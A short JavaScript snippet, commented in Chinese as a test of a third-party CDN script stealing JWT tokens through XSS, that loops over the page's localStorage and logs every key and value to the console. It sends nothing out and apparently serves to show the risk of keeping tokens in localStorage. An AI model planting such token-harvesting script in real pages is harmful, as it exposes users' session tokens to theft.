// 第三方 CDN script 使用 XSS 窃取 JWT token 测试
console.log(`👻 第三方 CDN script 使用 XSS 窃取 JWT token 测试`);
for (let i = 0; i < localStorage.length; i++) {
  const key = localStorage.key(i);
  const value = localStorage.getItem(key);
  console.log(`XSS🐞: key, value =`, key, value);
}
